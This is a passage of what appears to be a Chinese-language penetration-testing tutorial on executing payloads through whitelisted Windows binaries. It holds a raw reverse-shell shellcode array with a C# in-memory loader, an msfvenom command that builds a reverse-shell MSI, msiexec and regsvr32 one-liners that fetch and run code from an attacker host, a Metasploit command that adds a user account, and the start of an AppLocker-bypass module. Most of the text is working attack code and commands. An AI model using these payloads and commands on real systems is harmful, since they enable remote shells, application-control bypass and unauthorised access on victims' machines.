<span class="token number">0x4b</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0x5d</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0xbe</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0x73</span><span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0x33</span><span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span>x00<span class="token punctuation">,</span>

<span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xe6</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x81</span><span class="token punctuation">,</span><span class="token number">0xec</span><span class="token punctuation">,</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span>xe5<span class="token punctuation">,</span>

<span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0xbc</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0xa8</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span>xe4<span class="token punctuation">,</span>

<span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0xba</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0x26</span><span class="token punctuation">,</span><span class="token number">0x07</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xea</span><span class="token punctuation">,</span>x68<span class="token punctuation">,</span>

<span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0xba</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span>x0a<span class="token punctuation">,</span>

<span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x5e</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x4d</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xc9</span><span class="token punctuation">,</span><span class="token number">0x4d</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span>x89<span class="token punctuation">,</span>

<span class="token number">0xc2</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xc1</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0xba</span><span class="token punctuation">,</span><span class="token number">0xea</span><span class="token punctuation">,</span><span class="token number">0x0f</span><span class="token punctuation">,</span><span class="token number">0xdf</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span>xd5<span class="token punctuation">,</span>

<span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xc7</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xe2</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xf9</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span>xba<span class="token punctuation">,</span>

<span class="token number">0x99</span><span class="token punctuation">,</span><span class="token number">0xa5</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x0a</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xce</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span>xe5<span class="token punctuation">,</span>

<span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token number">0x93</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xec</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xe2</span><span class="token punctuation">,</span><span class="token number">0x4d</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span>xc9<span class="token punctuation">,</span>

<span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xf9</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0xba</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0xd9</span><span class="token punctuation">,</span><span class="token number">0xc8</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span>xd5<span class="token punctuation">,</span>

<span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token number">0x55</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xc4</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x5e</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xf6</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span>x41<span class="token punctuation">,</span>

<span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xc9</span><span class="token punctuation">,</span>x41<span class="token punctuation">,</span>

<span class="token number">0xba</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0xa4</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span><span class="token number">0xe5</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xc3</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xc7</span><span class="token punctuation">,</span><span class="token number">0x4d</span><span class="token punctuation">,</span>x31<span class="token punctuation">,</span>

<span class="token number">0xc9</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xda</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xf9</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0xba</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0xd9</span><span class="token punctuation">,</span>xc8<span class="token punctuation">,</span>

<span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x7d</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span>x40<span class="token punctuation">,</span>

<span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x5a</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0xba</span><span class="token punctuation">,</span><span class="token number">0x0b</span><span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">,</span><span class="token number">0x0f</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span>xd5<span class="token punctuation">,</span>

<span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0xba</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span><span class="token number">0x4d</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xce</span><span class="token punctuation">,</span><span class="token number">0xe9</span><span class="token punctuation">,</span>x3c<span class="token punctuation">,</span>

<span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xc3</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0xc6</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0xf6</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0xb4</span><span class="token punctuation">,</span>x41<span class="token punctuation">,</span>

<span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xe7</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0xc7</span><span class="token punctuation">,</span><span class="token number">0xc2</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">0xb5</span><span class="token punctuation">,</span><span class="token number">0xa2</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span>xd5 <span class="token punctuation">}</span><span class="token punctuation">;</span>


UInt32 funcAddr <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>shellcode <span class="token punctuation">.</span>Length<span class="token punctuation">,</span>

MEM_COMMIT<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>

Marshal<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>shellcode <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>IntPtr<span class="token punctuation">)</span><span class="token punctuation">(</span>funcAddr<span class="token punctuation">)</span><span class="token punctuation">,</span> shellcode <span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>

IntPtr hThread <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">;</span>

UInt32 threadId <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> 

IntPtr pinfo <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">;</span> 

hThread <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> funcAddr<span class="token punctuation">,</span> pinfo<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ref threadId<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token punctuation">}</span> 

private <span class="token keyword">static</span> UInt32 MEM_COMMIT <span class="token operator">=</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> 

private <span class="token keyword">static</span> UInt32 PAGE_EXECUTE_READWRITE <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span> 

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span>UInt32 lpStartAddr<span class="token punctuation">,</span>UInt32 size<span class="token punctuation">,</span> UInt32 flAllocationType<span class="token punctuation">,</span> UInt32 flProtect<span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

private <span class="token keyword">static</span> <span class="token keyword">extern</span> bool <span class="token function">VirtualFree</span><span class="token punctuation">(</span>IntPtr lpAddress<span class="token punctuation">,</span>

UInt32 dwSize<span class="token punctuation">,</span> UInt32 dwFreeType<span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

private <span class="token keyword">static</span> <span class="token keyword">extern</span> IntPtr <span class="token function">CreateThread</span><span class="token punctuation">(</span> 

UInt32 lpThreadAttributes<span class="token punctuation">,</span>

UInt32 dwStackSize<span class="token punctuation">,</span>

UInt32 lpStartAddress<span class="token punctuation">,</span>

IntPtr param<span class="token punctuation">,</span>

UInt32 dwCreationFlags<span class="token punctuation">,</span>

ref UInt32 lpThreadId

<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

private <span class="token keyword">static</span> <span class="token keyword">extern</span> bool <span class="token function">CloseHandle</span><span class="token punctuation">(</span>IntPtr handle<span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span> 

IntPtr hHandle<span class="token punctuation">,</span>

UInt32 dwMilliseconds

<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

private <span class="token keyword">static</span> <span class="token keyword">extern</span> IntPtr <span class="token function">GetModuleHandle</span><span class="token punctuation">(</span> 

string moduleName 

<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">GetProcAddress</span><span class="token punctuation">(</span> 

IntPtr hModule<span class="token punctuation">,</span>

string procName 

<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">LoadLibrary</span><span class="token punctuation">(</span> 

string lpFileName 

<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token punctuation">}</span>
</code></pre>
<hr>
<h2><a id="118_Msiexecpayload_1263"></a>11.8 基于白名单Msiexec执行payload（八）</h2>
<p><strong>Msiexec简介：</strong></p>
<p>Msiexec 是 Windows Installer 的一部分。用于安装 Windows Installer 安装包（MSI）,一般在运行 Microsoft Update 安装更新或安装部分软件的时候出现，占用内存比较大。并且集成于 Windows 2003，Windows 7 等。</p>
<p>说明：Msiexec.exe所在路径已被系统添加PATH环境变量中，因此，Msiexec命令可识别。</p>
<p><strong>基于白名单Msiexec.exe配置payload：</strong></p>
<p>Windows 2003 默认位置：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\WINDOWS\system32\msiexec<span class="token punctuation">.</span>exe
C<span class="token punctuation">:</span>\WINDOWS\SysWOW64\msiexec<span class="token punctuation">.</span>exe
</code></pre>
<p>攻击机：192.168.1.4 Debian<br>
靶机： 192.168.1.119 Windows 2003</p>
<p><strong>配置攻击机msf：</strong></p>
<p><img src="https://img-blog.csdnimg.cn/20201010160125649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>配置payload：</strong></p>
<pre><code class="prism language-c">msfvenom ‐p windows<span class="token operator">/</span>x64<span class="token operator">/</span>shell<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span> LPORT<span class="token operator">=</span><span class="token number">53</span> ‐ f msi <span class="token operator">&gt;</span> Micropoor_rev_x64_53<span class="token punctuation">.</span>txt
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010160144721.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201010160150740.png#pic_center" alt="在这里插入图片描述"><br>
靶机执行：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\System32\msiexec<span class="token punctuation">.</span>exe <span class="token operator">/</span>q <span class="token operator">/</span>i http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token operator">/</span>Micropoor_rev\_x64_53<span class="token punctuation">.</span>txt
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020101016020518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201010160210446.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201010160216435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="119_Regsvr32payload_1302"></a>11.9 基于白名单Regsvr32执行payload（九）</h2>
<p><strong>Regsvr32简介：</strong></p>
<p>Regsvr32命令用于注册COM组件，是 Windows 系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行。WinXP及以上系统的regsvr32.exe在windows\system32文件夹下；2000系统的regsvr32.exe在winnt\system32文件夹下。但搭配regsvr32.exe使用的 DLL，需要提供 DllRegisterServer 和 DllUnregisterServer两个输出函式，或者提供DllInstall输出函数。</p>
<p>说明：Regsvr32.exe所在路径已被系统添加PATH环境变量中，因此，Regsvr32命令可识别。</p>
<p>Windows 2003 默认位置：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\WINDOWS\SysWOW64\regsvr32<span class="token punctuation">.</span>exe
C<span class="token punctuation">:</span>\WINDOWS\system32\regsvr32<span class="token punctuation">.</span>exe
</code></pre>
<p>攻击机：192.168.1.4 Debian<br>
靶机： 192.168.1.119 Windows 2003</p>
<p>msf 已内置auxiliary版本的regsvr32_command_delivery_server，但是最新版已经无exploit版本regsvr32，文章结尾补充。</p>
<p><strong>配置攻击机msf：</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>server<span class="token operator">/</span>regsvr32_command_delivery_server<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use auxiliary<span class="token operator">/</span>server<span class="token operator">/</span>regsvr32_command_delivery_server
msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>server<span class="token operator">/</span>regsvr32_command_delivery_server<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set CMD net user Micropoor Micropoor <span class="token operator">/</span>add
CMD <span class="token operator">=</span><span class="token operator">&gt;</span> net user Micropoor Micropoor <span class="token operator">/</span>add
msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>server<span class="token operator">/</span>regsvr32_command_delivery_server<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Using URL<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.0</span><span class="token punctuation">:</span><span class="token number">8080</span><span class="token operator">/</span>ybn7xESQYCGv
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Local IP<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">8080</span><span class="token operator">/</span>ybn7xESQYCGv
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Server started<span class="token punctuation">.</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Run the following command on the target machine<span class="token punctuation">:</span>

regsvr32 <span class="token operator">/</span>s <span class="token operator">/</span>n <span class="token operator">/</span>u <span class="token operator">/</span>i<span class="token punctuation">:</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">8080</span><span class="token operator">/</span>ybn7xESQYCGv scrobj<span class="token punctuation">.</span>dll
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010160333162.png#pic_center" alt="在这里插入图片描述"><br>
<strong>靶机执行：</strong></p>
<pre><code class="prism language-c">regsvr32 <span class="token operator">/</span>s <span class="token operator">/</span>n <span class="token operator">/</span>u <span class="token operator">/</span>i<span class="token punctuation">:</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">8080</span><span class="token operator">/</span>ybn7xESQYCGv scrobj<span class="token punctuation">.</span>dll
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010160348923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201010160356692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201010160402858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201010160409883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>附：powershell 版 Regsvr32</strong><br>
regsvr32_applocker_bypass_server.rb</p>
<pre><code class="prism language-c">##

<span class="token macro property"># This module requires Metasploit: http://metasploit.com/download</span>
<span class="token macro property"># Current source: https://github.com/rapid7/metasploit‐framework</span>

## 

class MetasploitModule <span class="token operator">&lt;</span> Msf<span class="token punctuation">:</span><span class="token punctuation">:</span>Exploit<span class="token punctuation">:</span><span class="token punctuation">:</span>Remote
Rank <span class="token operator">=</span> ManualRanking 

include Msf<span class="token punctuation">:</span><span class="token punctuation">:</span>Exploit<span class="token punctuation">:</span><span class="token punctuation">:</span>Powershell
